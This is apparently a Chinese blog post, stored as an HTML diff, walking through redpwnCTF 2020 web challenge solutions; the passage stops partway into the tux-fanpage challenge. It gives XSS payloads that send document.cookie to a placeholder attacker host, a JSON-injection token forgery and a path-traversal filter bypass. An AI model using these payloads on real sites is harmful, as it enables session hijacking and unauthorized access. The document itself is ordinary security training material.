@@ -1,0 +1,1538 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>redpwnCTF 2020 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="redpwnCTF 2020">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-06-30 19:24" pubdate>
+        2020年6月30日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      115
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">redpwnCTF 2020</h1>
+            
+            <div class="markdown-body">
+              <blockquote>
+<p>国外的一场比赛，好多题没写出来，赛后这几天从github上下了dockerfile  复现学习一下</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/redpwn/redpwnctf-2020-challenges">https://github.com/redpwn/redpwnctf-2020-challenges</a></p>
+</blockquote>
+<h2 id="web-static-pastebin"><a href="#web-static-pastebin" class="headerlink" title="web/static-pastebin"></a>web/static-pastebin</h2><blockquote>
+<p>I wanted to make a website to store bits of text, but I don’t have any experience with web development. However, I realized that I don’t need any! If you experience any issues, make a paste and send it <a target="_blank" rel="noopener" href="https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin">here</a></p>
+<p>Site: <a target="_blank" rel="noopener" href="https://static-pastebin.2020.redpwnc.tf/">static-pastebin.2020.redpwnc.tf</a></p>
+<p>Note: The site is entirely static. Dirbuster will not be useful in solving it.</p>
+</blockquote>
+<p>题目描述给了两个网址，一个类似代码高亮的纯静态页，一个提交网址xssbot会访问的网站，可以初步判断为xss打cookie</p>
+<p>纯静态页面的话可以分析下js是这么过滤的</p>
+<pre><code class="hljs javascript">(<span class="hljs-keyword">async</span> () =&gt; &#123;
+    <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> &#123;
+        <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">&#x27;load&#x27;</span>, resolve);
+    &#125;);
+
+    <span class="hljs-keyword">const</span> content = <span class="hljs-built_in">window</span>.location.hash.substring(<span class="hljs-number">1</span>);
+    display(atob(content));
+&#125;)();
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">display</span>(<span class="hljs-params">input</span>) </span>&#123;
+    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;paste&#x27;</span>).innerHTML = clean(input);
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clean</span>(<span class="hljs-params">input</span>) </span>&#123;
+    <span class="hljs-keyword">let</span> brackets = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">let</span> result = <span class="hljs-string">&#x27;&#x27;</span>;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; input.length; i++) &#123;
+        <span class="hljs-keyword">const</span> current = input.charAt(i);
+        <span class="hljs-keyword">if</span> (current == <span class="hljs-string">&#x27;&lt;&#x27;</span>) &#123;
+            brackets ++;
+        &#125;
+        <span class="hljs-keyword">if</span> (brackets == <span class="hljs-number">0</span>) &#123;
+            result += current;
+        &#125;
+        <span class="hljs-keyword">if</span> (current == <span class="hljs-string">&#x27;&gt;&#x27;</span>) &#123;
+            brackets --;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">return</span> result
+&#125;</code></pre>
+
+<p>可以看出对<code>&lt;&gt;</code>包裹的会被过滤，单是先传入<code>&gt;</code>会导致 <code>brackets=-1</code>,后面传入<code>&lt; brackets=0</code>就不会被过滤  </p>
+<pre><code class="hljs javascript">&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">ddddddhm</span>&quot;);&gt;</span></span>
+<span class="xml">// 打cookie</span>
+&gt;&lt;img src=x onerror=window.location.href=&#x27;https://ip/?c=&#x27;+document.cookie;&gt;</code></pre>
+
+<p>可以用python开一个服务或nc收cookie</p>
+<p><img src="https://s1.ax1x.com/2020/06/30/NIrEb4.png" srcset="/img/loading.gif" alt="NIrEb4.png"></p>
+<h2 id="web-panda-facts"><a href="#web-panda-facts" class="headerlink" title="web/panda-facts"></a>web/panda-facts</h2><blockquote>
+<p>I just found a hate group targeting my favorite animal. Can you try and find their secrets? We gotta take them down!</p>
+<p>Site: <a target="_blank" rel="noopener" href="https://panda-facts.2020.redpwnc.tf/">panda-facts.2020.redpwnc.tf</a></p>
+</blockquote>
+<p>输入用户名即可登陆，登陆后提示 You are not a member</p>
+<p><img src="https://s1.ax1x.com/2020/06/30/NIfmIU.png" srcset="/img/loading.gif" alt="NIfmIU.png"></p>
+<p>给了源码，瞧下源码</p>
+<pre><code class="hljs javascript"><span class="hljs-built_in">global</span>.__rootdir = __dirname;
+
+<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);
+<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);
+<span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);
+<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);
+<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);
+
+<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;dotenv&#x27;</span>).config();
+
+<span class="hljs-keyword">const</span> INTEGRITY = <span class="hljs-string">&#x27;12370cc0f387730fb3f273e4d46a94e5&#x27;</span>;
+
+<span class="hljs-keyword">const</span> app = express();
+
+app.use(bodyParser.json(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));
+app.use(cookieParser());
+
+app.post(<span class="hljs-string">&#x27;/api/login&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;
+    <span class="hljs-keyword">if</span> (!req.body.username || <span class="hljs-keyword">typeof</span> req.body.username !== <span class="hljs-string">&#x27;string&#x27;</span>) &#123;
+        res.status(<span class="hljs-number">400</span>);
+        res.end();
+        <span class="hljs-keyword">return</span>;
+    &#125;
+    res.json(&#123;<span class="hljs-string">&#x27;token&#x27;</span>: <span class="hljs-keyword">await</span> generateToken(req.body.username)&#125;);
+    res.end;
+&#125;);
+
+app.get(<span class="hljs-string">&#x27;/api/validate&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;
+    <span class="hljs-keyword">if</span> (!req.cookies.token || <span class="hljs-keyword">typeof</span> req.cookies.token !== <span class="hljs-string">&#x27;string&#x27;</span>) &#123;
+        res.json(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Invalid token&#x27;</span>&#125;);
+        res.end();
+        <span class="hljs-keyword">return</span>;
+    &#125;
+
+    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> decodeToken(req.cookies.token);
+    <span class="hljs-keyword">if</span> (!result) &#123;
+        res.json(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Invalid token&#x27;</span>&#125;);
+        res.end();
+        <span class="hljs-keyword">return</span>;
+    &#125;
+
+    res.json(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">token</span>: result&#125;);
+&#125;);
+
+app.get(<span class="hljs-string">&#x27;/api/flag&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;
+    <span class="hljs-keyword">if</span> (!req.cookies.token || <span class="hljs-keyword">typeof</span> req.cookies.token !== <span class="hljs-string">&#x27;string&#x27;</span>) &#123;
+        res.json(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Invalid token&#x27;</span>&#125;);
+        res.end();
+        <span class="hljs-keyword">return</span>;
+    &#125;
+
+    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> decodeToken(req.cookies.token);
+    <span class="hljs-keyword">if</span> (!result) &#123;
+        res.json(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Invalid token&#x27;</span>&#125;);
+        res.end();
+        <span class="hljs-keyword">return</span>;
+    &#125;
+
+    <span class="hljs-keyword">if</span> (!result.member) &#123;
+        res.json(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;You are not a member&#x27;</span>&#125;);
+        res.end();
+        <span class="hljs-keyword">return</span>;
+    &#125;
+
+    res.json(&#123;<span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">flag</span>: process.env.FLAG&#125;);
+&#125;);
+
+app.use(express.static(path.join(__dirname, <span class="hljs-string">&#x27;/public&#x27;</span>)));
+
+app.listen(process.env.PORT || <span class="hljs-number">3000</span>);
+
+<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateToken</span>(<span class="hljs-params">username</span>) </span>&#123;
+    <span class="hljs-keyword">const</span> algorithm = <span class="hljs-string">&#x27;aes-192-cbc&#x27;</span>; 
+    <span class="hljs-keyword">const</span> key = Buffer.from(process.env.KEY, <span class="hljs-string">&#x27;hex&#x27;</span>); 
+    <span class="hljs-comment">// Predictable IV doesn&#x27;t matter here</span>
+    <span class="hljs-keyword">const</span> iv = Buffer.alloc(<span class="hljs-number">16</span>, <span class="hljs-number">0</span>);
+
+    <span class="hljs-keyword">const</span> cipher = crypto.createCipheriv(algorithm, key, iv);
+
+    <span class="hljs-keyword">const</span> token = <span class="hljs-string">`&#123;&quot;integrity&quot;:&quot;<span class="hljs-subst">$&#123;INTEGRITY&#125;</span>&quot;,&quot;member&quot;:0,&quot;username&quot;:&quot;<span class="hljs-subst">$&#123;username&#125;</span>&quot;&#125;`</span>
+
+    <span class="hljs-keyword">let</span> encrypted = <span class="hljs-string">&#x27;&#x27;</span>;
+    encrypted += cipher.update(token, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>);
+    encrypted += cipher.final(<span class="hljs-string">&#x27;base64&#x27;</span>);
+    <span class="hljs-keyword">return</span> encrypted;
+&#125;
+
+<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decodeToken</span>(<span class="hljs-params">encrypted</span>) </span>&#123;
+    <span class="hljs-keyword">const</span> algorithm = <span class="hljs-string">&#x27;aes-192-cbc&#x27;</span>; 
+    <span class="hljs-keyword">const</span> key = Buffer.from(process.env.KEY, <span class="hljs-string">&#x27;hex&#x27;</span>); 
+    <span class="hljs-comment">// Predictable IV doesn&#x27;t matter here</span>
+    <span class="hljs-keyword">const</span> iv = Buffer.alloc(<span class="hljs-number">16</span>, <span class="hljs-number">0</span>);
+    <span class="hljs-keyword">const</span> decipher = crypto.createDecipheriv(algorithm, key, iv);
+
+    <span class="hljs-keyword">let</span> decrypted = <span class="hljs-string">&#x27;&#x27;</span>;
+
+    <span class="hljs-keyword">try</span> &#123;
+        decrypted += decipher.update(encrypted, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);
+        decrypted += decipher.final(<span class="hljs-string">&#x27;utf8&#x27;</span>);
+    &#125; <span class="hljs-keyword">catch</span> (error) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    &#125;
+
+    <span class="hljs-keyword">let</span> res;
+    <span class="hljs-keyword">try</span> &#123;
+        res = <span class="hljs-built_in">JSON</span>.parse(decrypted);
+    &#125; <span class="hljs-keyword">catch</span> (error) &#123;
+        <span class="hljs-built_in">console</span>.log(error);
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    &#125;
+
+    <span class="hljs-keyword">if</span> (res.integrity !== INTEGRITY) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    &#125;
+
+    <span class="hljs-keyword">return</span> res;
+&#125;
+</code></pre>
+
+<p>关注到这一行</p>
+<pre><code class="hljs javascript"><span class="hljs-keyword">const</span> token = <span class="hljs-string">`&#123;&quot;integrity&quot;:&quot;<span class="hljs-subst">$&#123;INTEGRITY&#125;</span>&quot;,&quot;member&quot;:0,&quot;username&quot;:&quot;<span class="hljs-subst">$&#123;username&#125;</span>&quot;&#125;`</span></code></pre>
+
+<p>把member伪造成1应该可以得到flag，token aes-192-cbc加密加密生成，也不知道密匙,因为密匙在环境变量中</p>
+<pre><code class="hljs javascript"><span class="hljs-keyword">const</span> key = Buffer.from(process.env.KEY, <span class="hljs-string">&#x27;hex&#x27;</span>);</code></pre>
+
+<p>引入一个小知识点  JSON parsers会用最后一个值，也就是要是能在后面再构造一个为1的member就能覆盖掉</p>
+<p><img src="https://s1.ax1x.com/2020/06/30/NI4eCF.png" srcset="/img/loading.gif" alt="NI4eCF.png"></p>
+<p>token哪username可控，尝试注入传入<code>gg&quot;,&quot;member&quot;:1,&quot;a&quot;:&quot;</code>,最后token变为 <code>&#123;&quot;integrity&quot;:&quot;1&quot;,&quot;member&quot;:0,&quot;username&quot;:&quot;gg&quot;,&quot;member&quot;:1,&quot;a&quot;:&quot;&quot;&#125;</code> ，flag到手</p>
+<p><img src="https://s1.ax1x.com/2020/06/30/NI5EqI.png" srcset="/img/loading.gif" alt="NI5EqI.png"></p>
+<h2 id="web-static-static-hosting"><a href="#web-static-static-hosting" class="headerlink" title="web/static-static-hosting"></a>web/static-static-hosting</h2><blockquote>
+<p>Seeing that my last website was a success, I made a version where instead of storing text, you can make your own custom websites! If you make something cool, send it to me <a target="_blank" rel="noopener" href="https://admin-bot.redpwnc.tf/submit?challenge=static-static-hosting">here</a></p>
+<p>Site: <a target="_blank" rel="noopener" href="https://static-static-hosting.2020.redpwnc.tf/">static-static-hosting.2020.redpwnc.tf</a></p>
+<p>Note: The site is entirely static. Dirbuster will not be useful in solving it.</p>
+</blockquote>
+<p>上面那题xss的升级版，也能看过滤的js代码</p>
+<pre><code class="hljs javascript">(<span class="hljs-keyword">async</span> () =&gt; &#123;
+    <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> &#123;
+        <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">&#x27;load&#x27;</span>, resolve);
+    &#125;);
+
+    <span class="hljs-keyword">const</span> content = <span class="hljs-built_in">window</span>.location.hash.substring(<span class="hljs-number">1</span>);
+    display(atob(content));
+&#125;)();
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">display</span>(<span class="hljs-params">input</span>) </span>&#123;
+    <span class="hljs-built_in">document</span>.documentElement.innerHTML = clean(input);
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clean</span>(<span class="hljs-params">input</span>) </span>&#123;
+    <span class="hljs-keyword">const</span> template = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;template&#x27;</span>);
+    <span class="hljs-keyword">const</span> html = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;html&#x27;</span>);
+    template.content.appendChild(html);
+    html.innerHTML = input;
+
+    sanitize(html);
+
+    <span class="hljs-keyword">const</span> result = html.innerHTML;
+    <span class="hljs-keyword">return</span> result;
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params">element</span>) </span>&#123;
+    <span class="hljs-keyword">const</span> attributes = element.getAttributeNames();
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; attributes.length; i++) &#123;
+        <span class="hljs-comment">// Let people add images and styles</span>
+        <span class="hljs-keyword">if</span> (![<span class="hljs-string">&#x27;src&#x27;</span>, <span class="hljs-string">&#x27;width&#x27;</span>, <span class="hljs-string">&#x27;height&#x27;</span>, <span class="hljs-string">&#x27;alt&#x27;</span>, <span class="hljs-string">&#x27;class&#x27;</span>].includes(attributes[i])) &#123;
+            element.removeAttribute(attributes[i]);
+        &#125;
+    &#125;
+
+    <span class="hljs-keyword">const</span> children = element.children;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; children.length; i++) &#123;
+        <span class="hljs-keyword">if</span> (children[i].nodeName === <span class="hljs-string">&#x27;SCRIPT&#x27;</span>) &#123;
+            element.removeChild(children[i]);
+            i --;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            sanitize(children[i]);
+        &#125;
+    &#125;
+&#125;</code></pre>
+
+<p>标签属性只能带<code>&#39;src&#39;, &#39;width&#39;, &#39;height&#39;, &#39;alt&#39;, &#39;class&#39;</code>,其他的属性全部移除掉，可以利用<code>iframe</code>构造</p>
+<pre><code class="hljs javascript">&lt;iframe src=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;
+
+&lt;iframe src=<span class="hljs-string">&quot;javascript:top.location.href=&#x27;http://ip/?c=&#x27;+document.cookie&quot;</span>&gt;</code></pre>
+
+<p>和上面一样传过去就有flag了</p>
+<p>flag{wh0_n33d5_d0mpur1fy} </p>
+<p>ps .在这里用window.location、self、this失败了，猜是不许页面内引入。 除了top还可以用parent代替</p>
+<h2 id="web-tux-fanpage"><a href="#web-tux-fanpage" class="headerlink" title="web/tux-fanpage"></a>web/tux-fanpage</h2><blockquote>
+<p>My friend made a fanpage for Tux; can you steal the source code for me?</p>
+<p>Site: <a target="_blank" rel="noopener" href="https://tux-fanpage.2020.redpwnc.tf/">tux-fanpage.2020.redpwnc.tf</a></p>
+</blockquote>
+<p>给了源码</p>
+<pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)
+<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>)
+<span class="hljs-keyword">const</span> app = express()
+
+<span class="hljs-comment">//Don&#x27;t forget to redact from published source</span>
+<span class="hljs-keyword">const</span> flag = <span class="hljs-string">&#x27;[REDACTED]&#x27;</span>
+
+app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;
+    res.redirect(<span class="hljs-string">&#x27;/page?path=index.html&#x27;</span>)
+&#125;)
+
+app.get(<span class="hljs-string">&#x27;/page&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;
+
+    <span class="hljs-keyword">let</span> path = req.query.path
+
+    <span class="hljs-comment">//Handle queryless request</span>
+    <span class="hljs-keyword">if</span>(!path || !strip(path))&#123;
+        res.redirect(<span class="hljs-string">&#x27;/page?path=index.html&#x27;</span>)
+        <span class="hljs-keyword">return</span>
+    &#125;
+
+    path = strip(path)
+
+    path = preventTraversal(path)
+
+    res.sendFile(prepare(path), <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;
+        <span class="hljs-keyword">if</span>(err)&#123;
+            <span class="hljs-keyword">if</span> (! res.headersSent) &#123;
+                <span class="hljs-keyword">try</span> &#123;
+                    res.send(strip(req.query.path) + <span class="hljs-string">&#x27; not found&#x27;</span>)
+                &#125; <span class="hljs-keyword">catch</span> &#123;
+                    res.end()
+                &#125;
+            &#125;
+        &#125;
+    &#125;)
+&#125;)
+
+<span class="hljs-comment">//Prevent directory traversal attack</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">preventTraversal</span>(<span class="hljs-params">dir</span>)</span>&#123;
+    <span class="hljs-keyword">if</span>(dir.includes(<span class="hljs-string">&#x27;../&#x27;</span>))&#123;
+        <span class="hljs-keyword">let</span> res = dir.replace(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)
+        <span class="hljs-keyword">return</span> preventTraversal(res)
+    &#125;
+
+    <span class="hljs-comment">//In case people want to test locally on windows</span>
+    <span class="hljs-keyword">if</span>(dir.includes(<span class="hljs-string">&#x27;..\\&#x27;</span>))&#123;
+        <span class="hljs-keyword">let</span> res = dir.replace(<span class="hljs-string">&#x27;..\\&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)
+        <span class="hljs-keyword">return</span> preventTraversal(res)
+    &#125;
+    <span class="hljs-keyword">return</span> dir
+&#125;
+
+<span class="hljs-comment">//Get absolute path from relative path</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">prepare</span>(<span class="hljs-params">dir</span>)</span>&#123;
+    <span class="hljs-keyword">return</span> path.resolve(<span class="hljs-string">&#x27;./public/&#x27;</span> + dir)
+&#125;
+
+<span class="hljs-comment">//Strip leading characters</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strip</span>(<span class="hljs-params">dir</span>)</span>&#123;
+    <span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/^[a-z0-9]$/im</span>
+
+    <span class="hljs-comment">//Remove first character if not alphanumeric</span>
+    <span class="hljs-keyword">if</span>(!regex.test(dir[<span class="hljs-number">0</span>]))&#123;
+        <span class="hljs-keyword">if</span>(dir.length &gt; <span class="hljs-number">0</span>)&#123;
+            <span class="hljs-keyword">return</span> strip(dir.slice(<span class="hljs-number">1</span>))
+        &#125;
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>
+    &#125;
+
+    <span class="hljs-keyword">return</span> dir
+&#125;
+
+app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;
+    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;listening on 0.0.0.0:3000&#x27;</span>)
+&#125;)
+</code></pre>
+
+<p>要求读文件，但是又很多过滤，一个一个看,首先是这个strip</p>
+<pre><code class="hljs javascript"><span class="hljs-comment">//Strip leading characters</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strip</span>(<span class="hljs-params">dir</span>)</span>&#123;
+    <span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/^[a-z0-9]$/im</span>
+
+    <span class="hljs-comment">//Remove first character if not alphanumeric</span>
+    <span class="hljs-keyword">if</span>(!regex.test(dir[<span class="hljs-number">0</span>]))&#123;
+        <span class="hljs-keyword">if</span>(dir.length &gt; <span class="hljs-number">0</span>)&#123;
+            <span class="hljs-keyword">return</span> strip(dir.slice(<span class="hljs-number">1</span>))
+        &#125;
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>
+    &#125;
+
+    <span class="hljs-keyword">return</span> dir
+&#125;</code></pre>
+
+<p>传入字符的时候没影响，但是传入数组的时候情况有不同</p>
+<p><img src="https://s1.ax1x.com/2020/07/01/NTkUm9.png" srcset="/img/loading.gif" alt="NTkUm9.png"></p>
+<p>数组第一个为单个字符就可以过</p>
+<p>看preventTraversal()</p>
+<pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">preventTraversal</span>(<span class="hljs-params">dir</span>)</span>&#123;
+    <span class="hljs-keyword">if</span>(dir.includes(<span class="hljs-string">&#x27;../&#x27;</span>))&#123;
+        <span class="hljs-keyword">let</span> res = dir.replace(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)
+        <span class="hljs-keyword">return</span> preventTraversal(res)
+    &#125;
+
+    <span class="hljs-comment">//In case people want to test locally on windows</span>
+    <span class="hljs-keyword">if</span>(dir.includes(<span class="hljs-string">&#x27;..\\&#x27;</span>))&#123;
+        <span class="hljs-keyword">let</span> res = dir.replace(<span class="hljs-string">&#x27;..\\&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)
+        <span class="hljs-keyword">return</span> preventTraversal(res)
+    &#125;
+    <span class="hljs-keyword">return</span> dir
+&#125;</code></pre>
+
+<p>include 对字符和数组的结果有不同之处</p>
